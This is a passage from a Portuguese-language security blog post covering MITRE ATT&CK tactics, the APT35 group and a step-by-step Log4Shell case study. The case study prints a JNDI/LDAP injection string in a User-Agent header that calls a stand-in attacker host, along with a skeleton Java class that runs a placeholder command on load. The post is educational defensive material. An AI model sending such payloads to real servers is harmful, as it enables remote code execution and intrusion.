<li><strong>Desenvolvimento de Recursos - Resource Development (TA0042)</strong>: O invasor tenta estabelecer recursos que podem ser usados para apoiar as opera√ß√µes, seja criando, comprando ou comprometendo/roubando recursos que podem ser usados para apoiar o direcionamento. Esses recursos incluem infraestrutura , contas ou recursos.</li>
<li><strong>Acesso Inicial - Initial Access (TA0001)</strong>: Consiste em t√©cnicas que utilizam v√°rios vetores de entrada para obter um acesso inicial dentro de uma rede.</li>
<li><strong>Evas√£o de Defesa - Defense Evasion (TA0005)</strong>: Os atacantes usam t√©cnicas para evitar a detec√ß√£o durante todo o processo de comprometimento.</li>
<li><strong>Descoberta - Discovery (TA0007)</strong> - O atacante tenta obter o m√°ximo de conhecimento poss√≠vel sobre o sistema e a rede interna.</li>
<li><strong>Execu√ß√£o - Execution (TA0002)</strong>: Consiste em t√©cnicas que resultam na execu√ß√£o de c√≥digo controlado pelo advers√°rio em um sistema local ou remoto.</li>
<li><strong>Escala√ß√£o de Privil√©gios - Privilege Escalation (TA0004)</strong>: As t√©cnicas consistem em tentar obter permiss√µes maiores em um sistema ou rede, como um root por exemplo.</li>
<li><strong>Persist√™ncia - Persistence (TA0003)</strong>: Os advers√°rios utilizam t√©cnicas para manter o acesso aos sistemas ap√≥s reinicializa√ß√µes, altera√ß√µes de credenciais e outras formas de interrup√ß√µes que poderiam cortar o seu acesso.</li>
<li><strong>Movimento Lateral - Lateral Movement (TA0008)</strong>: O advers√°rio tenta ampliar seu campo de ataque e atingir mais sistemas em uma rede.</li>
<li><strong>Comando e controle - Command and Control C2 (TA0011)</strong>:  O atacante tenta se comunicar com sistemas comprometidos para control√°-los.</li>
<li><strong>Exfiltra√ß√£o - Exfiltration (TA0010)</strong>: Os advers√°rios se utilizam de t√©cnicas para roubar dados da rede invadida.</li>
<li><strong>Impacto - Impact (TA0040)</strong>: O advers√°rio tenta manipular, interromper ou destruir os sistemas e dados de um alvo. O impacto consiste em utilizar t√©cnicas que possam interromper a disponibilidade ou comprometer a integridade, manipulando processos comerciais e operacionais.</li>
</ol>
<h3 id="313-t√©cnicas-e-procedimentos">3.1.3. T√©cnicas e Procedimentos</h3>
<p>As <strong>T√©cnicas</strong> no MITRE ATT&amp;CK descrevem ‚Äúcomo‚Äù o advers√°rio atinge um objetivo t√°tico ( o ‚Äú por que‚Äù).</p>
<p>Os <strong>Procedimentos</strong> s√£o a forma como um grupo APT aplica uma t√©cnica**.** Por exemplo, o grupo <strong>APT35</strong>  implementa a t√©cnica <strong>Explorar aplicativos voltados para o p√∫blico - Exploit Public-Facing Application (T1190)</strong> utilizando de forma espec√≠fica a explora√ß√£o da vulnerabilidade CVE 2021-44228 <strong>(Log4Shell)</strong> em  aplica√ß√µes web que usam Java.</p>
<p>A sofistica√ß√£o de um APT reside em sua capacidade de encadear diversas t√©cnicas (Ts) e procedimentos (Ps) de forma bem coordenada e adaptativa, assim garante que o ataque persista e atinja o objetivo final, que √© a <strong>Exfiltra√ß√£o</strong> ou <strong>Impacto</strong> (como sabotagem).</p>
<h3 id="32-aplica√ß√µes-web-como-vetor-de-entrada-comum">3.2. Aplica√ß√µes Web como Vetor de Entrada Comum</h3>
<p>Conforme foi dito no decorrer do texto, as <strong>aplica√ß√µes web</strong> representam um vetor de entrada bastante comum e cr√≠tico para os grupos de APT. Na matriz do <em>MITRE</em> essa t√°tica √© classificada como <strong>T1190: Explorar aplicativos voltados para o p√∫blico (Exploit Public-Facing Application)</strong>, dito mais acima.</p>
<blockquote>
<p>‚ÄúOs advers√°rios podem tentar explorar uma vulnerabilidade em um host ou sistema voltado para a Internet para acessar inicialmente uma rede. A vulnerabilidade no sistema pode ser um bug de software, uma falha tempor√°ria ou uma configura√ß√£o incorreta.</p>
<p>Os aplicativos explorados geralmente s√£o sites/servidores da web, mas podem tamb√©m incluir banco de dados (como SQL), servi√ßos padr√µes (SMB ou SSH), protocolos de administra√ß√£o e gerenciamento de dispositivos de rede (SNMP e Smart Install) e qualquer outro sistema com soquetes abertos acess√≠veis pela Internet.</p>
<p><em>MITRE ATT&amp;CK</em>- Technique T1190</p>
</blockquote>
<p>A explora√ß√£o de aplica√ß√µes web e servidores para o p√∫blico √© um m√©todo preferencial para obter o Acesso Inicial, pois permite que os atacantes possam contornar as defesas tradicionais. As vulnerabilidades mais exploradas por APTs em aplica√ß√µes web incluem algumas das j√° destacadas anteriormente pelo OWASP Top 10, justamente por mapear as fragilidades mais comuns na atualidade.</p>
<h2 id="4-explora√ß√£o-de-aplica√ß√µes-web-via-log4shell-cve-2021-44228">4. Explora√ß√£o de Aplica√ß√µes web via Log4Shell (CVE 2021-44228)</h2>
<p>O APT35 tamb√©m conhecido como <strong>Charming Kitten</strong>, <strong>Magic Hound</strong> e <strong>Phosphorus</strong>, √© um grupo de amea√ßas cibern√©ticas patrocinado pelo Ir√£ que conduz opera√ß√µes de espionagem cibern√©tica de longo prazo. Eles tem como alvo funcion√°rios governamentais e militares europeus, norte-americanos e do Oriente M√©dio, acad√™micos, jornalistas e organiza√ß√µes como a Organiza√ß√£o Mundial da Sa√∫de (OMS).</p>
<p>As opera√ß√µes do APT35 s√£o comumente caracterizadas por campanhas de engenharia social sofisticadas e suas atividades s√£o rastreadas desde 2014.</p>
<table>
<thead>
<tr>
<th>Atributo do APT</th>
<th>Detalhe</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>ID</strong></td>
<td>G0059</td>
</tr>
<tr>
<td><strong>Nome</strong></td>
<td>Magic Hound (APT35, Charming Kitten, Phosphorus)</td>
</tr>
<tr>
<td><strong>Origem Atribu√≠da</strong></td>
<td>Ir√£</td>
</tr>
<tr>
<td><strong>Alvos comuns</strong></td>
<td>Governo, militares, acad√™micos, jornalistas e organiza√ß√µes de sa√∫de no Oriente M√©dio, Europa e EUA.</td>
</tr>
<tr>
<td><strong>T√°tica Prim√°ria</strong></td>
<td>Campanhas de engenharia social complexas.</td>
</tr>
<tr>
<td><strong>Ferramentas Not√°veis</strong></td>
<td><strong>PowerShell</strong>, <em>webshells</em>, e ferramentas de compress√£o como <strong>RAR</strong> e <strong>gzip</strong>. Al√©m do uso de malwares como o <em>backdoor</em> <strong>PowerLess</strong>.</td>
</tr>
</tbody>
</table>
<h3 id="41-log4shell">4.1. Log4Shell</h3>
<p>O  <strong>Log4Shell</strong> (CVE 2021-44228) √© uma vulnerabilidade <strong>zero day</strong> que foi reportada em novembro de 2021, que possibilita a <strong>execu√ß√£o de c√≥digo remoto (RCE)</strong> em algumas vers√µes da biblioteca de logging Apache Log4j <strong>2.x de 2.0-beta9 at√© 2.14.1</strong> e afeta diretamente a <strong>Camada de Aplica√ß√£o</strong> de diversas apps da web que s√£o baseados em Java.</p>
<p>Este estudo de caso detalha tecnicamente essa explora√ß√£o do Log4Shell, focando principalmente em como um input em uma aplica√ß√£o web pode se transformar em um RCE, e mapeando os ataques com base no OWASP Top 10.</p>
<p>Um ponto importante √© que o Log4Shell √© um ataque que se manifesta na <strong>Camada de Aplica√ß√£o</strong> na arquitetura de tr√™s camadas, mas √© iniciado atrav√©s da <strong>Camada de Apresenta√ß√£o</strong>.</p>
<h3 id="411-o-papel-da-arquitetura-de-aplica√ß√µes-web-e-o-owasp">4.1.1 O papel da Arquitetura de Aplica√ß√µes Web e o OWASP</h3>
<p>O Log4Shell √© um ataque de <strong>inje√ß√£o de dados</strong> que se propaga atrav√©s das camadas:</p>
<table>
<thead>
<tr>
<th><strong>Camada da Arquitetura</strong></th>
<th><strong>Componente comum</strong></th>
<th><strong>CVE Relacionada</strong></th>
<th>Rela√ß√£o com o Ataque</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Apresenta√ß√£o</strong></td>
<td>Formul√°rios Web, Cabe√ßalhos HTTP</td>
<td><strong>CVE-2021-44228</strong></td>
<td>O atacante injeta o payload JNDI/LDAP em campos de entrada ou cabe√ßalhos HTTP ( <code>User-Agent</code>), que s√£o processados pela Camada de Aplica√ß√£o.</td>
</tr>
<tr>
<td><strong>L√≥gica de Neg√≥cio (Aplica√ß√£o)</strong></td>
<td>Servidor de Aplica√ß√£o Java (Tomcat, JBoss)</td>
<td><strong>CVE-2021-44228</strong></td>
<td>A vulnerabilidade reside na biblioteca Log4j 2.x, que √© parte da Camada de L√≥gica. O payload √© interpretado, resultando em RCE.</td>
</tr>
<tr>
<td><strong>Dados</strong></td>
<td>Banco de Dados (PostgreSQL, MySQL)</td>
<td>(Acesso Indireto)</td>
<td>O RCE obtido na Camada de Aplica√ß√£o permite o acesso e a manipula√ß√£o de dados sens√≠veis, <strong>amea√ßando a integridade e disponibilidade da camada de dados</strong>.</td>
</tr>
</tbody>
</table>
<p>Ademais, tamb√©m se enquadra primariamente na categoria <strong>A05:2025 - Injection</strong> do OWASP Top 10:2025,  pois o ataque √© uma forma de inje√ß√£o onde o atacante injeta uma <em>string</em> maliciosa (<code>${jndi:ldap://...}</code>) que √© interpretada pelo <em>logger</em> como um comando, assim acaba sabotando o fluxo de execu√ß√£o do programa.</p>
<h3 id="42-detalhes-do-ataque">4.2. Detalhes do ataque</h3>
<p><img alt="Log4SHell" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/zdoilksucqg4nei9h5ba.png">
<em>Source: Check Point Research</em></p>
<p>O Log4Shell explora a funcionalidade de lookups da Log4j, especificamente a capacidade de realizar consultas via <strong>JNDI (Java Naming and Directory Interface)</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">logger</span><span class="p">.</span><span class="na">info</span><span class="p">(</span><span class="s">&#34;Requisi√ß√£o de: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">userAgent</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><p>O logger √© respons√°vel por registrar mensagens de log, enquanto o m√©todo info grava uma mensagem de n√≠vel <strong>informativo</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">$</span><span class="p">{</span><span class="n">jndi</span><span class="p">:</span><span class="n">ldap</span><span class="p">:</span><span class="c1">//pedroca.com/payload}</span><span class="w">
</span></span></span></code></pre></div><p>A sintaxe de lookup do Log4j permite <strong>substitui√ß√µes din√¢micas</strong>, como no exemplo <code>${env:USERNAME}</code>, que √© substitu√≠do pelo valor da vari√°vel de ambiente <code>USERNAME</code> do sistema operacional.</p>
<p>Entretanto, nas vers√µes do <strong>Log4j 2.0 at√© 2.14.1</strong>, tamb√©m eram permitidos <em>lookups</em> via <strong>JNDI (Java Naming and Directory Interface)</strong>, uma API do Java usada para consultar <strong>servi√ßos de diret√≥rio em servidores externos</strong>, como LDAP (Lightweight Directory Access Protocol) ou RMI (Remote Method Invocation).</p>
<p>Esse recurso leg√≠timo acabou sendo explorado por atacantes para <strong>carregar e executar c√≥digo malicioso</strong> <strong>remotamente</strong>.</p>
<p>A explora√ß√£o do Log4 Shell √© um processo de quatro etapas que transforma um simples string de entrada em RCE.</p>
<h3 id="421-1¬∫-etapa-inje√ß√£o-do-payload-camada-de-apresenta√ß√£o">4.2.1. 1<strong>¬∫ Etapa: Inje√ß√£o do Payload (Camada de Apresenta√ß√£o)</strong></h3>
<p>O atacante injeta o payload JNDI em qualquer campo de entrada que possa ser logado pela aplica√ß√£o. E o vetor mais comum √© o cabe√ßalho <code>User-Agent</code> de uma requisi√ß√£o HTTP.</p>
<p><strong>Payload JNDI/LDAP:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">$</span><span class="p">{</span><span class="n">jndi</span><span class="p">:</span><span class="n">ldap</span><span class="p">:</span><span class="c1">//[IP.DO.INVASOR]:PORTA/[CLASSE.MALICIOSA]}</span><span class="w">
</span></span></span></code></pre></div><h3 id="422-2¬∫-etapa-interpreta√ß√£o-e-consulta-jndi-camada-de-aplica√ß√£o">4.2.2. 2<strong>¬∫ Etapa: Interpreta√ß√£o e Consulta JNDI (Camada de Aplica√ß√£o)</strong></h3>
<p>A aplica√ß√£o web recebe a requisi√ß√£o HTTP, o servidor de aplica√ß√£o processa essa requisi√ß√£o e, em determinado momento, o Log4j registra a entrada (<code>User-Agent</code>), consequentemente encontra a string <code>${PEDROCA}</code> e a interpreta como um lookup e e por fim o lookup JNDI √© resolvido, for√ßando o servidor Java a iniciar a conex√£o com o servidor LDAP controlado pelo(a) atacante (<code>[IP.DO.INVASOR]:Porta</code> ).</p>
<h3 id="423-3¬∫-etapa-resposta-do-servidor-ldap-e-deserializa√ß√£o">4.2.3. 3<strong>¬∫ Etapa: Resposta do Servidor LDAP e Deserializa√ß√£o</strong></h3>
<p>O servidor LDAP do/a atacante responde com uma refer√™ncia a classe Java maliciosa (<code>[CLASSE.MALICIOSA]</code> ) e URL para download do arquivo <code>.class</code>( via HTTP),  assim o cliente JNDI no servidor vulner√°vel (l√° da Camada de aplica√ß√£o) segue a refer√™ncia e baixa o arquivo <code>.class</code>  suspeito, fazendo o pr√≥prio servidor Java converter e executar o c√≥digo da classe suspeita, resultando em uma execu√ß√£o remota de c√≥digo (RCE).</p>
<h3 id="424-4¬∫-etapa-um-exemplo-de-classe-maliciosa-payload-de-rce">4.2.4. 4<strong>¬∫ Etapa: Um exemplo de Classe Maliciosa (Payload de RCE)</strong></h3>
<p>A classe suspeita √© estruturada para executar um comando do sistema operacional no momento da sua inicializa√ß√£o.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Exploit</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">static</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;payload de rce&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>O bloco static {} em java √© executado automaticamente quando a classe √© carregada e assim torna o ataque vi√°vel, pois o Log4j faz o lookup e carrega a classe.</p>
<h2 id="5-mapeamento-mitre-attck">5. Mapeamento MITRE ATT&amp;CK</h2>
<table>
<thead>
<tr>
<th>T√°tica</th>
<th>ID da T√°tica</th>
<th>T√©cnica</th>
<th>ID da T√©cnica</th>
<th>Descri√ß√£o do Uso no Log4Shell</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Initial Access</strong></td>
<td>TA0001</td>
<td>Exploit Public-Facing Application</td>
<td><strong>T1190</strong></td>
<td>Inje√ß√£o do payload JNDI/LDAP atrav√©s de uma entrada de aplica√ß√£o web.</td>
</tr>
<tr>
<td><strong>Execution</strong></td>
<td>TA0002</td>
<td>Command and Scripting Interpreter</td>
<td><strong>T1059</strong></td>
<td>Execu√ß√£o de comandos via <em>shell</em> reverso ou comandos do sistema operacional injetados na classe suspeita.</td>
</tr>
<tr>
<td><strong>Defense Evasion</strong></td>
<td>TA0005</td>
<td>Obfuscated Files or Information</td>
<td><strong>T1027</strong></td>
<td>Uso de lookups aninhados ou ofusca√ß√£o no payload JNDI para evitar detec√ß√£o.</td>
</tr>
</tbody>
</table>
<h2 id="5-conclus√£o">5. Conclus√£o</h2>
<p>A seguran√ßa de aplica√ß√µes web exige uma abordagem em maior profundidade que considere os vetores de ataque em cada camada de sua arquitetura. A an√°lise  das t√°ticas de grupos de APT como o APT35 mostra a explora√ß√£o de forma mais ampla sobre as vulnerabilidades, sendo o ataque Log4Shell um exemplo de como uma falha na Camada de Aplica√ß√£o (OWASP A05: Injection) pode levar a um RCE de impacto muito alto. Sua explora√ß√£o a partir da entrada de um simples string em uma aplica√ß√£o web, mostra a necessidade e import√¢ncia de valida√ß√£o de entrada e de uma postura de seguran√ßa mais s√≥lida em todas as camadas de arquitetura.</p>
<h2 id="7-refer√™ncias">7. Refer√™ncias</h2>
<p>Check Point. <em>APT35 exploits Log4j vulnerability to distribute new modular PowerShell toolkit</em>. Dispon√≠vel em: [<a href="https://research.checkpoint.com/2022/apt35-exploits-log4j-vulnerability-to-distribute-new-modular-powershell-toolkit/">https://research.checkpoint.com/2022/apt35-exploits-log4j-vulnerability-to-distribute-new-modular-powershell-toolkit/</a>]</p>
<p>CISA. <em>Apache Log4j Vulnerability Guidance</em>. Dispon√≠vel em: [<a href="https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance">https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance</a>]</p>
<p>MITRE ATT&amp;CK. <em>Group: Charming Kitten (G0067)</em>. Dispon√≠vel em: [<a href="https://attack.mitre.org/groups/G0059/">https://attack.mitre.org/groups/G0059/</a>]</p>
<p>MITRE ATT&amp;CK. <em>Enterprise ATT&amp;CK Matrix</em>. Dispon√≠vel em: [<a href="https://attack.mitre.org/matrices/enterprise/">https://attack.mitre.org/matrices/enterprise/</a>]</p>
<p>NVD. <em>CVE-2021-44228 Detail</em>. Dispon√≠vel em: [<a href="https://nvd.nist.gov/vuln/detail/cve-2021-44228">https://nvd.nist.gov/vuln/detail/cve-2021-44228</a>]</p>
<p>OWASP. (2025). <em>OWASP Top 10:2025</em>. Dispon√≠vel em: [<a href="https://owasp.org/Top10/">https://owasp.org/Top10/</a>]</p>
<p>Unit 42. <em>Apache log4j Vulnerability CVE-2021-44228</em>.
Dispon√≠vel em: [<a href="https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/">https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/</a>]</p>

            </div>
        </article></main>
</div>
<footer class="footer">
    <span class="footer_item"> </span>
    &nbsp;

    <div class="footer_social-icons">
<a href="https://github.com/obtuosa" target="_blank" rel="noopener noreferrer me"
    title="Github">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
    </path>
</svg>
</a>
<a href="/index.xml" target="_blank" rel="noopener noreferrer me"
    title="Rss">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path d="M4 11a9 9 0 0 1 9 9" />
    <path d="M4 4a16 16 0 0 1 16 16" />
    <circle cx="5" cy="19" r="1" />
</svg>
</a>
</div>
    <small class="footer_copyright">
        ¬© 2025 .
        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
    </small>
</footer><a href="#" title="Go to top" id="totop">
    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
</svg>

</a>


    




    
    
        
    

    
    
        
    



    
    <script src="https://obtuosa.github.io/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>

    

</body>
</html>
